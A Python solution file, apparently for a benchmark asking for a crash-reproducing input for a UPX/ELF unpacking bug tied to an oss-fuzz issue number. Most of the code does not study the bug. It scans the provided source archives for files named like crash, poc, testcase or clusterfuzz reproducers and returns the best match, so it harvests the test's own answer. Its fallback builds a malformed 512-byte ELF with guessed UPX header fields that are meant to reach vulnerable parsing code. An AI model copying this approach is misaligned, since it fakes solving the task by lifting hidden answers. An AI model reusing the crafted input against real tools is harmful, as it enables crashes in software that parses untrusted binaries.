import os
import io
import re
import bz2
import gzip
import lzma
import tarfile
import zipfile
import struct
from typing import Iterator, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        best = self._find_embedded_poc(src_path)
        if best is not None:
            return best
        return self._fallback_poc_512()

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        keywords = (
            "crash",
            "poc",
            "repro",
            "reproducer",
            "clusterfuzz",
            "testcase",
            "minimized",
            "oss-fuzz",
            "383200048",
        )

        def score(name: str, data: bytes) -> int:
            ln = len(data)
            n = name.lower()
            s = 0
            if ln == 512:
                s += 200000
            s += max(0, 20000 - abs(ln - 512) * 20)
            if data.startswith(b"\x7fELF"):
                s += 50000
            if b"UPX!" in data:
                s += 40000
            if b".upx" in data.lower():
                s += 10000
            for k in keywords:
                if k in n:
                    s += 15000
            if ln <= 2048:
                s += 5000
            if ln <= 65536:
                s += 2000
            s -= ln // 16
            return s

        best_score = -1
        best_data = None

        def consider(name: str, data: bytes):
            nonlocal best_score, best_data
            if not data:
                return
            s = score(name, data)
            if s > best_score:
                best_score = s
                best_data = data

        # Phase 1: focus on small files and likely filenames
        for name, data in self._iter_all_files(src_path, max_file_size=65536, filename_filter=keywords):
            consider(name, data)
            if best_data is not None and len(best_data) == 512 and best_data.startswith(b"\x7fELF") and b"UPX!" in best_data:
                return best_data

        # Phase 2: scan slightly larger (in case PoC is embedded in a small-ish blob/archive)
        for name, data in self._iter_all_files(src_path, max_file_size=2 * 1024 * 1024, filename_filter=keywords):
            consider(name, data)
            if best_data is not None and len(best_data) == 512 and (best_data.startswith(b"\x7fELF") or b"UPX!" in best_data):
                return best_data

        if best_data is not None and best_score >= 30000:
            return best_data
        return None

    def _iter_all_files(
        self,
        src_path: str,
        max_file_size: int,
        filename_filter=(),
    ) -> Iterator[Tuple[str, bytes]]:
        seen = set()

        def want_name(name: str) -> bool:
            if not filename_filter:
                return True
            ln = name.lower()
            return any(k in ln for k in filename_filter)

        def yield_blob(name: str, data: bytes, depth: int):
            if depth > 2:
                return
            key = (name, len(data), data[:16])
            if key in seen:
                return
            seen.add(key)
            yield (name, data)

            # Recurse into embedded archives if they are plausible and not too large.
            if len(data) > max_file_size:
                return

            # zip
            if data.startswith(b"PK\x03\x04") or data.startswith(b"PK\x05\x06") or data.startswith(b"PK\x07\x08"):
                try:
                    with zipfile.ZipFile(io.BytesIO(data)) as zf:
                        for zi in zf.infolist():
                            if zi.is_dir():
                                continue
                            if zi.file_size <= 0 or zi.file_size > max_file_size:
                                continue
                            ename = f"{name}::{zi.filename}"
                            if want_name(ename) or zi.file_size == 512:
                                try:
                                    b = zf.read(zi)
                                except Exception:
                                    continue
                                for it in yield_blob(ename, b, depth + 1):
                                    yield it
                except Exception:
                    pass
                return

            # gzip
            if data.startswith(b"\x1f\x8b"):
                out = self._decompress_gzip_limited(data, max_file_size)
                if out is not None:
                    for it in yield_blob(name + "::gzip", out, depth + 1):
                        yield it
                return

            # xz
            if data.startswith(b"\xfd7zXZ\x00"):
                out = self._decompress_xz_limited(data, max_file_size)
                if out is not None:
                    for it in yield_blob(name + "::xz", out, depth + 1):
                        yield it
                return

            # bz2
            if data.startswith(b"BZh"):
                out = self._decompress_bz2_limited(data, max_file_size)
                if out is not None:
                    for it in yield_blob(name + "::bz2", out, depth + 1):
                        yield it
                return

        # If src_path is a directory, traverse it directly.
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > max_file_size:
                        continue
                    rel = os.path.relpath(p, src_path)
                    if want_name(rel) or st.st_size == 512:
                        try:
                            with open(p, "rb") as f:
                                data = f.read(max_file_size + 1)
                        except OSError:
                            continue
                        if len(data) > max_file_size:
                            continue
                        for it in yield_blob(rel, data, 0):
                            yield it
            return

        # Otherwise, treat it as an archive or a plain file.
        try:
            # tar
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, mode="r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > max_file_size:
                            continue
                        name = m.name
                        if not (want_name(name) or m.size == 512):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read(max_file_size + 1)
                        except Exception:
                            continue
                        if len(data) > max_file_size:
                            continue
                        for it in yield_blob(name, data, 0):
                            yield it
                return
        except Exception:
            pass

        # zip
        try:
            with open(src_path, "rb") as f:
                head = f.read(8)
        except OSError:
            head = b""

        if head.startswith(b"PK"):
            try:
                with zipfile.ZipFile(src_path) as zf:
                    for zi in zf.infolist():
                        if zi.is_dir():
                            continue
                        if zi.file_size <= 0 or zi.file_size > max_file_size:
                            continue
                        name = zi.filename
                        if not (want_name(name) or zi.file_size == 512):
                            continue
                        try:
                            data = zf.read(zi)
                        except Exception:
                            continue
                        for it in yield_blob(name, data, 0):
                            yield it
                return
            except Exception:
                pass

        # plain file fallback
        try:
            st = os.stat(src_path)
            if st.st_size > 0 and st.st_size <= max_file_size:
                with open(src_path, "rb") as f:
                    data = f.read(max_file_size + 1)
                if len(data) <= max_file_size:
                    for it in yield_blob(os.path.basename(src_path), data, 0):
                        yield it
        except OSError:
            pass

    def _decompress_gzip_limited(self, data: bytes, limit: int) -> Optional[bytes]:
        try:
            with gzip.GzipFile(fileobj=io.BytesIO(data)) as gz:
                out = gz.read(limit + 1)
            if len(out) > limit:
                return None
            return out
        except Exception:
            return None

    def _decompress_xz_limited(self, data: bytes, limit: int) -> Optional[bytes]:
        try:
            dec = lzma.LZMADecompressor()
            out = dec.decompress(data, max_length=limit + 1)
            if len(out) > limit:
                return None
            # If there is unused_data, ignore; still return what we have.
            return out
        except Exception:
            return None

    def _decompress_bz2_limited(self, data: bytes, limit: int) -> Optional[bytes]:
        try:
            dec = bz2.BZ2Decompressor()
            out = dec.decompress(data)
            if len(out) > limit:
                return None
            return out
        except Exception:
            return None

    def _fallback_poc_512(self) -> bytes:
        # 512-byte synthetic ELF64 + embedded UPX! marker.
        b = bytearray(512)

        # ELF64 header (little-endian)
        # e_ident
        b[0:4] = b"\x7fELF"
        b[4] = 2  # ELFCLASS64
        b[5] = 1  # ELFDATA2LSB
        b[6] = 1  # EV_CURRENT
        b[7] = 0  # System V
        # rest of e_ident already zero

        # e_type=ET_DYN(3), e_machine=EM_X86_64(62), e_version=1
        struct.pack_into("<HHI", b, 16, 3, 62, 1)
        # e_entry=0
        struct.pack_into("<Q", b, 24, 0)
        # e_phoff=64, e_shoff=0
        struct.pack_into("<QQ", b, 32, 64, 0)
        # e_flags=0
        struct.pack_into("<I", b, 48, 0)
        # e_ehsize=64, e_phentsize=56, e_phnum=1, e_shentsize=0, e_shnum=0, e_shstrndx=0
        struct.pack_into("<HHHHHH", b, 52, 64, 56, 1, 0, 0, 0)

        # One PT_LOAD program header at offset 64 (0x40)
        # p_type=PT_LOAD(1), p_flags=PF_R|PF_X(5), p_offset=0, p_vaddr=0, p_paddr=0
        # p_filesz=512, p_memsz=512, p_align=0x1000
        struct.pack_into("<IIQQQQQQ", b, 64, 1, 5, 0, 0, 0, 512, 512, 0x1000)

        # Embed UPX! signature and some header-like bytes (not necessarily valid UPX).
        off = 0x100
        b[off:off + 4] = b"UPX!"
        b[off + 4:off + 8] = b"\x0d\x00\x00\x00"  # version-ish / padding
        # Add some plausible fields
        # method bytes sequence and lengths that could lead into vulnerable logic if parsed.
        # Keep within 512.
        struct.pack_into("<I", b, off + 8, 0x00000002)     # method-ish
        struct.pack_into("<I", b, off + 12, 0x00000010)    # u_len-ish
        struct.pack_into("<I", b, off + 16, 0x00000020)    # c_len-ish
        struct.pack_into("<I", b, off + 20, 0x00000000)    # adler-ish
        struct.pack_into("<I", b, off + 24, 0x00000000)    # adler-ish

        # Additional markers seen in UPX-packed ELFs
        b[0x120:0x128] = b".upx0\x00\x00"
        b[0x128:0x130] = b".upx1\x00\x00"
        b[0x130:0x138] = b".upx2\x00\x00"
        b[0x138:0x140] = b".shstr\x00"

        # Sprinkle some non-zero data to avoid overly trivial all-zero sections.
        for i in range(0x160, 0x200):
            b[i] = (i * 1315423911 + 0x9E3779B9) & 0xFF

        return bytes(b)